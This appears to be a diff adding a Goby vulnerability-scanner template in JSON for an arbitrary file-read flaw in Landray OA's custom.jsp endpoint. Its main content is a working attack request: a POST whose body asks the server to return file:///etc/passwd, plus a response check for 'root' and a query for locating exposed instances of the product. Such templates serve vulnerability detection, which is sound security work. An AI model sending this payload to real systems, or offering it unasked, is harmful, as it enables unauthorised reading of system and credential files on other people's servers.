@@ -1,0 +1,62 @@
+{
+      "Name": "Landray OA custom.jsp Fileread",
+      "Level": "3",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "app=\"landray-OA\"",
+      "Description": "Shenzhen Lanling Software Co., Ltd. was established in 2001, a leader in ecological OA and a professional service provider of digital work.",
+      "Product": "Landray OA",
+      "Homepage": "https://www.landray.com/",
+      "Author": "",
+      "Impact": "Landray OA custom.jsp Fileread",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/sys/ui/extend/varkind/custom.jsp",
+                        "follow_redirect": false,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+                              "Content-Length": "42",
+                              "Content-Type": "application/x-www-form-urlencoded",
+                              "Accept-Encoding": "gzip"
+                        },
+                        "data_type": "text",
+                        "data": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
